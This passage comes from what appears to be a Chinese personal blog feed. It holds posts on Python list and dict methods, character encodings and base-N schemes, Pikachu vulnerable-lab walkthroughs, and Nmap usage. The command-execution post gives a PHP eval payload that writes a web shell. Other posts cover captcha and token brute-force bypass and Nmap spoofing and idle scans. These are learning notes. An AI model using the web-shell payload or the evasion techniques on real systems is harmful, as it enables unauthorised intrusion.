移除列表中某个值的第一个匹配项</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-reverse.html">list.reverse()</a> 反向列表中元素</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-sort.html">list.sort( key=None, reverse=False)</a> 对原列表进行排序</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-clear.html">list.clear()</a> 清空列表</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-copy.html">list.copy()</a> 复制列表</td></tr></tbody></table><h2 id="三、字典"><a href="#三、字典" class="headerlink" title="三、字典"></a>三、字典</h2><p>Python字典包含了以下内置函数：</p><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">len(dict) 计算字典元素个数，即键的总数。</td><td align="left"><code>&gt;&gt;&gt; tinydict = &#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;&#125; &gt;&gt;&gt; len(tinydict) 3</code></td></tr><tr><td align="left">2</td><td align="left">str(dict) 输出字典，可以打印的字符串表示。</td><td align="left"><code>&gt;&gt;&gt; tinydict = &#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;&#125; &gt;&gt;&gt; str(tinydict) &quot;&#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Class&#39;: &#39;First&#39;, &#39;Age&#39;: 7&#125;&quot;</code></td></tr><tr><td align="left">3</td><td align="left">type(variable) 返回输入的变量类型，如果变量是字典就返回字典类型。</td><td align="left"><code>&gt;&gt;&gt; tinydict = &#123;&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;&#125; &gt;&gt;&gt; type(tinydict) &lt;class &#39;dict&#39;&gt;</code></td></tr></tbody></table><p>Python字典包含了以下内置方法：</p><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-clear.html">radiansdict.clear()</a> 删除字典内所有元素</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-copy.html">radiansdict.copy()</a> 返回一个字典的浅复制</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-fromkeys.html">radiansdict.fromkeys()</a> 创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-get.html">radiansdict.get(key, default=None)</a> 返回指定键的值，如果键不在字典中返回 default 设置的默认值</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-in.html">key in dict</a> 如果键在字典dict里返回true，否则返回false</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-items.html">radiansdict.items()</a> 以列表返回一个视图对象</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-keys.html">radiansdict.keys()</a> 返回一个视图对象</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-setdefault.html">radiansdict.setdefault(key, default=None)</a> 和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-update.html">radiansdict.update(dict2)</a> 把字典dict2的键/值对更新到dict里</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-values.html">radiansdict.values()</a> 返回一个视图对象</td></tr><tr><td align="left">11</td><td align="left">pop(key[<a href="https://www.runoob.com/python3/python3-att-dictionary-pop.html">,default])</a> 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-popitem.html">popitem()</a> 返回并删除字典中的最后一对键和值。</td></tr></tbody></table><p>摘抄自：</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于编码方式的总结</title>
      <link href="/2022/01/14/%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81/"/>
      <url>/2022/01/14/%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="各类编码总结"><a href="#各类编码总结" class="headerlink" title="各类编码总结"></a>各类编码总结</h1><h2 id="一、ascii、UTF-8、gbk"><a href="#一、ascii、UTF-8、gbk" class="headerlink" title="一、ascii、UTF-8、gbk"></a>一、ascii、UTF-8、gbk</h2><h3 id="1、ascii码"><a href="#1、ascii码" class="headerlink" title="1、ascii码"></a>1、ascii码</h3><p>ASCII 码一共规定了128个字符的编码：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/v2-976d8be2a77238a37736be97bac66497_r.jpg" alt="preview"></p><h3 id="2、UTF-8、UTF-16、UTF-32"><a href="#2、UTF-8、UTF-16、UTF-32" class="headerlink" title="2、UTF-8、UTF-16、UTF-32"></a>2、UTF-8、UTF-16、UTF-32</h3><p><em>utf（Unicode Transformation Format）</em></p><h4 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8:"></a>UTF-8:</h4><p>​    utf-8是unicode的实现方法。其编码规则如下：</p><blockquote><p>1）对于单字节的符号：字节的第一位设为0，后面7位为这个符号的 Unicode 码。因此对于英语字母，UTF-8 编码和 ASCII 码是相同的；</p><p>2）对于n字节的符号（n &gt; 1）：第一个字节的前n位都设为1，第n + 1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的 Unicode 码。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/v2-6c143515986d542f67de787d85131ea9_r.jpg" alt="preview"></p><p><strong>举例说明：</strong></p><p>选择汉字“鲁”，在<code>unicode</code>官网查询其编码为<code>U+9C81</code></p><p>转换为二级制数字即为：1001 1100 1000 0001，大小两字节。</p><p>​    根据上表，“鲁”字在第三个范围内，其表示即为1110xxxx 10xxxxxx 10xxxxxx，故将前文中的二进制数字填入，即为：11101001 10110010 10000001，再转换为十六进制，即为E9B281。</p><p><strong>特征码：</strong></p><p><em>BOM（byte order mark）</em></p><p>​    在较早的Windows环境下，系统为了能够识别UTF-8这一编码格式，为UTF-8添加了<u>代表其格式的EF BB BF三位特征码（BOM）</u>，而后较高的Windows版本中，系统默认使用UTF-8这一编码格式，不再添加特征码(BOM)。经实验，若将XP环境下创建的、带有BOM的文件在Win10下打开，右下角会显示“带有BOM的UTF-8”字样，文件依然可以正常操作。</p><p><strong>优点、缺点</strong></p><p>缺点：</p><pre><code> 1. 英语国家用起来省空间，其他国家（语言）反而更费空间（汉字有可能需要三个字节） 2. 变长的储存方式导致执行索引效率低，有时需要转化为`UTF-16`或者`UTF-32`</code></pre><p>优点：</p><pre><code>1. 字符空间大于UTF-16；2. 不存在大小端序；3. 容错率高，容易检查出错误；</code></pre><h4 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16:"></a>UTF-16:</h4><p>即，使用两字节表示unicode的编码方法，有以下几个问题：</p><ol><li>大小端序的设置容易导致乱码；</li><li>两字节只能表示六万多个字符，不够用；</li><li>容错低，一处出错，后面全错；</li></ol><p><strong>端序：</strong></p><p>指字符按照什么顺序储存，与编码后内容一样即大端序，相反则小端序。</p><p>试举一例，一个“奎”的Unicode编码是594E，“乙”的Unicode编码是4E59。如果我们收到UTF-16字节流“594E”，那么这是“奎”还是“乙”？如果BOM是大端序，那么代码点就应该是594E，那么就是“奎”，如果BOM是小端序，那么代码点就应该是4E59，就是“乙”了。</p><h4 id="UTF-32："><a href="#UTF-32：" class="headerlink" title="UTF-32："></a>UTF-32：</h4><p>使用四字节表示Unicode的编码方式，占空间比较大。</p><h4 id="特征码（附）："><a href="#特征码（附）：" class="headerlink" title="特征码（附）："></a>特征码（附）：</h4><blockquote><p>有编码对应的开头标志：</p><p><code>EF BB BF        UTF-8 FE FF            UTF-16/UCS-2, little endian FF FE            UTF-16/UCS-2, big endian FF FE 00 00        UTF-32/UCS-4, little endian. 00 00 FE FF        UTF-32/UCS-4, big-endian.</code></p></blockquote><h3 id="3、GBK-GB2312"><a href="#3、GBK-GB2312" class="headerlink" title="3、GBK/GB2312"></a>3、GBK/GB2312</h3><blockquote><p>​    GB全称GuoBiao国标，GBK全称GuoBiaoKuozhan国标扩展。GB18030编码兼容GBK，GBK兼容GB2312，其实这三种编码有着非常深厚的渊源，我们放在一起进行比较。 【GB2312】最早一版的中文编码，每个字占据2bytes。由于要和ASCII兼容，那这2bytes最高位不可以为0了(否则和ASCII会有冲突)。在GB2312中收录了6763个汉字以及682个特殊符号，已经囊括了生活中最常用的所有汉字。</p></blockquote><p>​    总结来说，GBK就是两个字节组成的汉字字符集，同时其通过不让第一个字节为0的方式来兼容ascii码。实际上，有很多比较生僻的名字打不出来就是由于未被GB2312收录的原因。</p><p><strong>全角&amp;半角</strong>：</p><p>在GBK中，也收录了一些数字和字母，即ascii表中有的字母和数字，被GBK又收录了一遍。</p><p><u>那么，当我们直接使用ASCII码，用一个字节来表示数字和字母，就称之为<strong>半角</strong>；</u></p><p><u>若使用GBK中收录的那份数字和字母，用两个字节来表示数字和字母，就称之为<strong>全角</strong>；</u></p><p>通常我们使用半角，因为全角可能在编程过程中导致编译器不认识。</p><p><strong>big5</strong></p><p>big5是台湾搞出来的一种包括繁体的编码方式，与GBK不兼容。</p><p><strong>GB18030</strong></p><p>为了收录比GBK还多的汉字，使用四个字节来表示一个汉字，越来越复杂。</p><p>​    由于汉字编码方式不断迭代，迭代的同时又要保持兼容，GBK和GB2312比ASCII多出来的字都是2bytes，GB18030比GBK多出来的字都是4bytes，而ASCII、GB2312、GBK、GB18030直接有需要保持兼容性，最终就形成了被人诟病的国标汉字编码形式，具体可以参考下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/20645acf6cdf2aa38922bcfbeb676922.png" alt="20645acf6cdf2aa38922bcfbeb676922.png"></p><h2 id="二、乱码的来源"><a href="#二、乱码的来源" class="headerlink" title="二、乱码的来源"></a>二、乱码的来源</h2><h3 id="1、Unicode与国标的不兼容性"><a href="#1、Unicode与国标的不兼容性" class="headerlink" title="1、Unicode与国标的不兼容性"></a>1、Unicode与国标的不兼容性</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/a74eccea4783314561c09e8b3100eb65.png" alt="a74eccea4783314561c09e8b3100eb65.png"></p><p>只兼容ASCII部分。</p><h3 id="2、锟斤拷"><a href="#2、锟斤拷" class="headerlink" title="2、锟斤拷"></a>2、锟斤拷</h3><p>虽然<code>Unicode</code>号称万国码，但是依然有未收录的字符，同时每个地区或操作系统对字符的支持程度也是不同的，因此在<code>Unicode</code>中就有一个特殊字符来代表未知字符：�</p><p>它的<code>Unicode</code>编码为<code>0xFFFD</code>。</p><p>将其<code>Unicode</code>编码转化为<code>UTF-8</code>后，十六进制表示为<code>0xEF 0XBF 0XBD</code></p><p>若同时出现两个乱码符号，转化为十六进制就是<code>0xEF 0XBF 0XBD 0xEF 0XBF 0XBD</code></p><p>这时候再将其强行转码为<code>GBK</code>编码，因为GBK中用两个字节表示一个字符，那么上述的字符就成了<strong>锟</strong>（0xEFBF），<strong>斤</strong>（0xBDEF），<strong>拷</strong>（0xBFBD）。</p><h3 id="3、烫烫烫、屯屯屯、葺葺葺（qi四声）"><a href="#3、烫烫烫、屯屯屯、葺葺葺（qi四声）" class="headerlink" title="3、烫烫烫、屯屯屯、葺葺葺（qi四声）"></a>3、烫烫烫、屯屯屯、葺葺葺（qi四声）</h3><p>Visual Studio中，未初始化的栈空间（即静态分配的空间）用0xCC填充，而未初始化的堆空间（即动态分配的空间）用0xCD填充。</p><p>而0xCCCC和0xCDCD在中文GB2312编码中分别对应“烫”字和“屯”字。</p><p>如果一个字符串没有结束符’\0’，输出时就会打印出未初始化的栈或堆空间的内容，这就是大名鼎鼎的“烫烫烫”、“屯屯屯”乱码。</p><p>而分配了，又被删除的内存，使用0xDDDD来填充，对应“葺”字。</p><h2 id="三、base-XX编码是什么"><a href="#三、base-XX编码是什么" class="headerlink" title="三、base XX编码是什么"></a>三、base XX编码是什么</h2><h3 id="1、base-64、32、16编码流程"><a href="#1、base-64、32、16编码流程" class="headerlink" title="1、base 64、32、16编码流程"></a>1、base 64、32、16编码流程</h3><p>例如要被编码的字符串是：<code>ILU</code></p><ol><li><p>第一步：将 <code>ILU</code> 字符串中的每一个字符转为对应于 <code>Ascii</code> 编码表的值，I = 73, L = 76, U = 85。</p></li><li><p>第二步：将第一步中的 <code>Ascii</code> 值分别转为对应的<code>二进制</code>格式，要求必须是造成<code>8bit</code>，不足8比特位高位补0。例如：1 的二进制是 1，明显不够8位，最终应该显示为:<code>0000 0001</code>。<code>ILU</code> 的转化结果以下：</p><blockquote><p>73 = 01001001</p></blockquote><blockquote><p>76 = 01001100</p></blockquote><blockquote><p>85 = 01010101</p></blockquote></li><li><p>第三步：根据<code>base X</code>(这里的 X 表明 16，32，64等编号) 编码算法中所指定的<code>y 个 bit 位为一个字符在表格中的下标</code> 的规则，对第2步的进行划分。例如 <code>base 16</code>的规则要求，4位做为一个下标对应一个字符，即每4个位为一部分，故划分以下：</p><blockquote><p>第1部分：0100 是 (73 = 01001001，的前4个位)</p></blockquote><blockquote><p>第2部分：1001 是 (73 = 01001001，的后4个位)</p></blockquote><blockquote><p>第3部分：0100</p></blockquote><blockquote><p>第4部分：1100</p></blockquote><blockquote><p>第5部分：0101</p></blockquote><blockquote><p>第6部分：0101</p></blockquote></li><li><p>第四步：将第三步中划分出的<code>每一个部分</code>进行<code>10进制转换</code>，得出对应于10进制数的<code>下标值</code>，以下：</p><blockquote><p>0100 = 4，1001 = 9，4，12，5，5</p></blockquote></li><li><p>第五步：最后一步，将第4步中得出的<code>下标数</code>去<code>查表</code>，得出对应的字符，<code>连在一块儿，就是编码结果</code></p></li></ol><p>​    总结来说，对于16、32、64的<code>base X</code>编码，将内容转化为二进制，分别按<code>4、5、6</code>位分组，然后转化为字符形式即可，其中：</p><table><thead><tr><th align="center">名称</th><th align="left">下标数字的位个数</th><th align="left">编码表字符串</th><th align="left">位数不足是否会补全 =</th></tr></thead><tbody><tr><td align="center">base 16</td><td align="left">4</td><td align="left">数字0<del>9 和 字母 A</del>F</td><td align="left">不会，位数恰好是 4 的倍数</td></tr><tr><td align="center">base 32</td><td align="left">5</td><td align="left">大写字母A<del>Z 和 数字2</del>7</td><td align="left">会</td></tr><tr><td align="center">base 64</td><td align="left">6</td><td align="left">大写字母A<del>Z，小写字母a</del>z，数字0~9以及”+”，”/“</td><td align="left">会</td></tr></tbody></table><p>​    在编码后，base 16的字符数量会变为两倍；base 32会变为5/8倍；base 64会变为4/3倍。</p><h3 id="2、对base-2-n-编码尝试进行计算"><a href="#2、对base-2-n-编码尝试进行计算" class="headerlink" title="2、对base 2^n 编码尝试进行计算"></a>2、对base 2^n 编码尝试进行计算</h3><p>以字符串<code>Lhl_2507</code>为例：</p><p>以<code>utf-8</code>的形式编码为<code>十六进制</code>：<code>4c686c5f32353037</code>；</p><p>转化为二进制数：<code>0100 1100 0110 1000 0110 1100 0101 1111 0011 0010 0011 0101 0011 0000 0011 0111</code>；</p><p>然后分别按照4、5、6位分组：</p><p>​    其中base 16的结果就等同于<code>utf-8</code>的十六进制格式：<code>4c686c5f32353037</code>；</p><p>​    按照<code>五位</code>分组：<code>01001 10001 10100 00110 11000 10111 11001 10010 00110 10100 11000 00011 0111</code></p><p>​    按照<code>A~Z 2~7</code>分别对应<code>0~31</code>(五位二进制转十进制)，进行转化：<code>JRUGYXZSGUYD</code>为前十二位</p><p>​    最后一位需要补全，先补<code>0</code>变为二进制<code>01110</code>对应base 32中的<code>O</code></p><p>​    为了与十六进制统一，需要补充<code>=</code>作为字符数量，前面<code>5*4=20</code>的组合有三组，最后多余一组，因此补充三个<code>=</code></p><p>​    最终结果为<code>JRUGYXZSGUYDO===</code></p><p>​    base 64与base 32思路相同</p><p>​    其64位数分别对应<code> A~Z a~z 0~9 + /</code>用来对应0~63的十进制数</p><p>​    转化结果为<code>TGhsXzI1MDc=</code></p><h3 id="3、非2-n的base-XX编码"><a href="#3、非2-n的base-XX编码" class="headerlink" title="3、非2^n的base XX编码"></a>3、非2^n的base XX编码</h3><h4 id="base-58编码："><a href="#base-58编码：" class="headerlink" title="base 58编码："></a>base 58编码：</h4><blockquote><p>​    base58编码去掉了几个看起来会产生歧义的字符，如 0 (零), O (大写字母O), I (大写的字母i) and l (小写的字母L) ，和几个影响双击选择的字符，如/, +。结果字符集正好58个字符(包括9个数字，24个大写字母，25个小写字母)。</p><p>​    同时，由于58 不是2的整次幂，所以无法使用类似base64编码中使用直接截取3个字符转4个字符（3*8=4*6 , 2的6次方刚好64）的方法进行转换，而是采用我们数学上经常使用的进制转换方法——辗转相除法（本质上，base64编码是64进制，base58是58进制）。看下base58的编码表：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/20180620000601834" alt="img"></p><p>​    试举一例，若要将<code>Lhl</code>字符在utf-8编码下转化为base 58的形式：</p><p>​    转化为十六进制：<code>4c686c</code></p><p>​    十六进制转十进制：<code>5007468</code></p><p>​    十进制转58进制：辗转相除，然后将<code>58进制数字</code>转化为上表的表示形式即可。</p><p>​    结果为：<code>E3QvX8qx</code></p><h4 id="base-91编码："><a href="#base-91编码：" class="headerlink" title="base 91编码："></a>base 91编码：</h4><blockquote><p>​    base91是一种将二进制数据编码为ASCII字符的高级方法。它类似于uuencode或base64，但效率更高。base91产生的开销取决于输入数据。它的数量最多为23%（而base64为33%），其范围可以降低到14%，这通常发生在0字节块上。这使得base91在通过电子邮件或终端线路等二进制不安全连接传输较大文件时非常有用。</p><p>​    顾名思义，base91需要91个字符来表示用ASCII编码的二进制数据。在94个可打印的ASCII字符（0x21-0x7e）中，以下三个字符被省略以构建base91字母表：</p><p>​    -（破折号，0x2d）</p><p>​    \（反斜杠，0x5C）</p><p>​    ‘（撇号，0x27）</p><p>​    翻译表由如下所示的其余字符组成。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/20190816091541986.png" alt="img"></p><p>引用（参考）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[01]: http://www.hiencode.com/&quot;站长工具，用于转化编码&quot;</span><br><span class="line">[02]: https://blog.csdn.net/instruder/article/details/5963344&quot;base 32编码&quot;</span><br><span class="line">[03]: http://www.javashuo.com/article/p-ombqwauc-dc.html&quot;base16，base32，base64 编码方式的通俗讲解&quot;</span><br><span class="line">[04]: https://blog.csdn.net/idwtwt/article/details/80740474&quot;base58编码原理和实现&quot;</span><br><span class="line">[05]: https://blog.csdn.net/qq_42777804/article/details/99671341&quot;bugku 贝斯家族 （base91参照表）&quot;</span><br><span class="line">[06]: https://zhuanlan.zhihu.com/p/38333902&quot;字符编码那点事&quot;</span><br><span class="line">[07]: https://blog.csdn.net/weixin_30898967/article/details/113073386&quot;帮你彻底弄懂常见的中文字符编码&quot;</span><br><span class="line">[08]: https://www.zhihu.com/question/36899383&quot;为什么乱码总是写“屯屯屯屯屯屯屯”或是“烫烫烫烫烫烫”？&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pikachu_命令执行</title>
      <link href="/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY2_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY2_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="PIKACHU通关-命令执行"><a href="#PIKACHU通关-命令执行" class="headerlink" title="PIKACHU通关_命令执行"></a>PIKACHU通关_命令执行</h1><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。<br>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 但是如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p><h2 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h2><p>windows系统和<a href="https://so.csdn.net/so/search?q=linux">linux</a>系统各有4个，其中3个是共有的，各有1个是特有的：</p><ul><li>windows系统：| 、||、&amp;&amp;、&amp;</li><li>linux系统：| 、||、&amp;&amp;、;</li></ul><p>总结一下各连接符号的作用：</p><ol><li> |    管道符，用于把前一个命令的输出作为下一个命令的输入；</li><li> || 逻辑或，只有前一个命令成功，后一个就不执行，反之后一个执行；</li><li> &amp;&amp;逻辑与，只有前一个执行成功才执行后一个，否则不执行；</li><li> &amp; Windows独有，顺序执行每一条命令；</li><li> ；Linux独有，顺序执行每一条命令；</li></ol><h2 id="测试常用命令"><a href="#测试常用命令" class="headerlink" title="测试常用命令"></a>测试常用命令</h2><p><code>whoami</code>命令（Who am i），用于区分Windows和Linux环境：</p><p>（前者有两个参数，用”\“隔开，后者只显示用户名）</p><h2 id="PIKACHU-exec’ping’"><a href="#PIKACHU-exec’ping’" class="headerlink" title="PIKACHU_exec’ping’"></a>PIKACHU_exec’ping’</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111170123070.png" alt="image-20220111170123070"></p><p>没有任何过滤，随便乱杀。</p><h2 id="PIKACHU-exec’eval’"><a href="#PIKACHU-exec’eval’" class="headerlink" title="PIKACHU_exec’eval’"></a>PIKACHU_exec’eval’</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111210928950.png" alt="image-20220111210928950"></p><p>一样没有任何过滤，可以直接使用<code>phpinfo();</code>进行测试，</p><p>或者构造payload<code>fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php assert($_POST[lhl_2507]);?&gt;&#39;);</code></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pikachu_暴力破解</title>
      <link href="/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY1_%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY1_%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="PIKACHU通关-暴力破解"><a href="#PIKACHU通关-暴力破解" class="headerlink" title="PIKACHU通关_暴力破解"></a>PIKACHU通关_暴力破解</h1><p>暴力破解需要将表单传到 <strong>Intruder</strong>(入侵者)模块</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111100429372.png" alt="image-20220111100429372"></p><p>在这里记录一下四种四种<strong>AttackType</strong>:</p><ul><li><p><strong>Sinper</strong>（狙击手）:</p><p>输入一个字典，分别对每一个被标记的位置用此字典遍历。</p></li><li><p><strong>Battering ram</strong>（攻城槌）：</p><p>输入一个字典，同时对每一个被标记的位置用此字典遍历。</p></li><li><p><strong>Pitchfork</strong>（干草叉）</p><p>输入多个字典，按照顺序，从上到下对应遍历。（以最短的字典长度为遍历次数）</p></li><li><p><strong>Cluster bomb</strong>（集束炸弹）</p><p>输入多个字典，遍历所有可能性，排列组合。</p></li></ul><h2 id="第一关——普通爆破"><a href="#第一关——普通爆破" class="headerlink" title="第一关——普通爆破"></a>第一关——普通爆破</h2><p>回到暴力破解，我们使用<strong>Cluster bomb</strong>进行字典爆破：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111103021323.png" alt="image-20220111103021323"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111103527752.png" alt="image-20220111103527752"></p><p>分别对用户名和密码的爆破上传字典，<strong>若用户名和密码有特殊字符需求，不勾选URL-encoding:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111103740053.png" alt="image-20220111103740053"></p><p>点击开始爆破，观察返回报文的长短即可。</p><h2 id="第二关——绕过验证码（ON-SERVER）"><a href="#第二关——绕过验证码（ON-SERVER）" class="headerlink" title="第二关——绕过验证码（ON SERVER）"></a>第二关——绕过验证码（ON SERVER）</h2><p><strong>观察：</strong></p><p>发现页面首先验证验证码的正确性，然后验证用户名和密码。</p><p>同时进行抓包，发现验证码是后端验证。</p><p>但是本关的问题在于，只要不点击网页上的login按钮，验证码就不会刷新，因此使用发包的方式一直爆破即可。</p><p><strong>源码分析：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111111050870.png" alt="image-20220111111050870"></p><p>其一，在验证后，应重置验证码。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111111359414.png" alt="image-20220111111359414"></p><p>其二，不应将验证码作为cookie返回前端</p><h2 id="第三关——绕过验证码（ON-CLIENT）"><a href="#第三关——绕过验证码（ON-CLIENT）" class="headerlink" title="第三关——绕过验证码（ON CLIENT）"></a>第三关——绕过验证码（ON CLIENT）</h2><p>右键查看源代码：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111144849999.png" alt="image-20220111144849999"></p><p>发现验证码在前端验证。</p><h2 id="第四关——token防止爆破"><a href="#第四关——token防止爆破" class="headerlink" title="第四关——token防止爆破"></a>第四关——token防止爆破</h2><p>添加了token防止爆破，抓包进行观察，可以发现返回的包中含有下一次的token值。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111145923138.png" alt="image-20220111145923138"></p><p>因此，我们使用正则提取出token强行爆破：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111150453621.png" alt="image-20220111150453621"></p><p>使用正则表达式（Recursive grep）进行匹配，正则添加方法如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111150832658.png" alt="image-20220111150832658"></p><p>可以使用右边的Refetch response按钮确认报文中有多少符合此正则的位置。</p><p>因此可见，使用token防爆破还是没啥用。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nmap使用笔记</title>
      <link href="/2022/01/08/Nmap%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/08/Nmap%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="NMAP使用笔记"><a href="#NMAP使用笔记" class="headerlink" title="NMAP使用笔记"></a>NMAP使用笔记</h1><p>NMAP的作用是在信息收集阶段进行端口扫描。</p><h2 id="一、端口扫描："><a href="#一、端口扫描：" class="headerlink" title="一、端口扫描："></a>一、端口扫描：</h2><p>要给sudo权限</p><p><code>namp xx.com -p 80 -sS</code>（syn扫描方式）</p><p>此外还有-sS/sT/sA/sW/sM 分别对应SYN/Connect()/ACK/window/Maimon</p><p>-sU对应UDP</p><p>-sN/sF/sX对应TCP null/FIN/Xmas</p><p>加 <code>-sV -O</code>可以扫描主机版本 ，操作系统等等信息</p><p><code>namp xx.com -p 80 -A</code>效果相同（推荐） </p><p>扫描所有端口：<code>namp xx.com -A -sS</code>(不讲武德，推荐) </p><p>使用<code> -iR</code>随机扫描域名</p><p>扫描五个最常见的端口 <code>nmap xx.com --top-ports 5</code></p><p>输出到文件<code>-oN [文件路径+文件名]</code></p><p>脚本扫描<code>--script=[文件路径./...+文件名]</code></p><h2 id="二、防火墙欺骗："><a href="#二、防火墙欺骗：" class="headerlink" title="二、防火墙欺骗："></a>二、防火墙欺骗：</h2><p><code>-D1.1.1.1,2.2.2.2</code>冒充其他IP发包（伪造IP）</p><p><code>-g996</code>冒充其他源端口号（伪造端口）</p><p><code>--spoof-mac [MAC地址]</code>冒充其他mac地址</p><p><code> namp -iflist</code>输出正在使用的网络信息</p><p>还可以使用空闲扫描，使用网络上其他的空闲主机进行扫描：</p><p>先发现空闲主机：<code>sudo nmap --script ipedseq -iR 1000 -oN ipidseq.txt</code>(扫描一千个主机，输出到文件)</p><p>扫描结束后，使用空闲主机的ip和端口，使用命令：</p><p><code>nmap -Pn -sI [空闲IP:空闲端口] [目标IP]</code></p><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali安装</title>
      <link href="/2022/01/06/kali%E8%A3%85%E6%9C%BA%E8%BF%87%E7%A8%8B/"/>
      <url>/2022/01/06/kali%E8%A3%85%E6%9C%BA%E8%BF%87%E7%A8%8B/</url>
      
